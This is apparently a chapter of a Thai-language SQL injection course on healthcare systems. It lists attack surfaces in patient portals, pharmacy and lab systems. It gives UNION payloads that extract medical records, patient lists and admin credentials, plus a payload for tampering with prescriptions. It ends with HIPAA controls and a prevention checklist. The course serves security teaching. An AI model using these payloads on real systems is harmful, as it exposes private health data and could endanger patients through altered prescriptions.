# Part 081: SQL Injection ในระบบ Healthcare

## ภาพรวม

EHR (Electronic Health Records) และระบบสาธารณสุข - ผลกระทบมหาศาล

**ขั้นตอนที่ 1286-1300**

---

## 1286. ความเสี่ยง Healthcare

```
ระบบ Healthcare ที่ถูกโจมตีผ่าน SQL injection:

1. Patient Portal:
   - /patient/records?id=1234
   - search symptoms: SELECT FROM diagnoses

2. Pharmacy System:
   - drug lookup: SELECT FROM medications
   - prescription check: SELECT FROM prescriptions

3. Lab Systems:
   - order test: INSERT INTO lab_orders
   - result query: SELECT FROM lab_results

ผลกระทบ:
- ผู้โจมตีเข้าถึงประวัติการแพทย์, โรค, ยา
- แก้ไขผล lab และใบสั่งยา (life-threatening!)
- ละเมียดความเป็นส่วนตัว
- HIPAA violation ค่าปรับ $100-$50,000/violation
```

---

## 1287. Patient Record SQLi

```sql
-- Patient portal: /records?patient_id=1234

-- UNION เพื่อดึงข้อมูลแพทย์ทั้งหมด:
1234 UNION SELECT 1,patient_name,diagnosis,medication,5 FROM medical_records-- -

-- ดูผู้ใช้ทั้งหมด:
0 UNION SELECT 1,GROUP_CONCAT(patient_id,0x3a,patient_name SEPARATOR 0x0a),3,4,5 FROM patients-- -

-- ดู admin credentials:
0 UNION SELECT 1,username,password,4,5 FROM staff WHERE role='admin'-- -
```

---

## 1288. Prescription Manipulation

```sql
-- /api/prescription/create (POST)
-- ถ้า INSERT แบบ ไม่ใช้ parameterized:

-- Second-order: เปลี่ยนชื่อยาให้เป็นอันตราย:
medication_name = "Amoxicillin' + (SELECT CASE WHEN 1=1 THEN 'Warfarin' ELSE 'x' END) + '-- -"
-- ถ้ามีช่องโหว่ สามารถเปลี่ยนชื่อยาใน DB

-- คำเตือน: NEVER test healthcare systems without authorization!
-- บาง jurisdictions: unauthorized access to health systems = criminal offense
```

---

## 1289. HIPAA และ Security

```
HIPAA (Health Insurance Portability and Accountability Act)

Security Rule (45 CFR Part 164):

164.312(a)(1) Access Control:
  - ขั้นตอน authentication ที่มั่นคง
  -> Prevent auth bypass SQLi

164.312(b) Audit Controls:
  - Log การเข้าถึงและดึง ePHI
  -> SQL injection detection in logs

164.312(c)(1) Integrity:
  - ป้องกันการแก้ไขข้อมูลโดยไม่ได้รับอนุญาต
  -> Prevent SQL injection data tampering

Checklist:
[ ] Parameterized queries ทุก query
[ ] Encrypt PHI at rest (AES-256)
[ ] MFA สำหรับการเข้าถึงสู่ PHI
[ ] Annual pentest
[ ] Security training สำหรับ developers
[ ] WAF สำหรับ web applications
[ ] Logging + SIEM monitoring
```

---

## สรุป

Healthcare SQL Injection:
- **High impact** - life safety และ HIPAA violation
- **Attack vectors** - patient portal, prescriptions, lab
- **HIPAA** - Access control, audit, integrity
- **Prevention** - parameterized, MFA, pentest annually

---

*Part 081 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
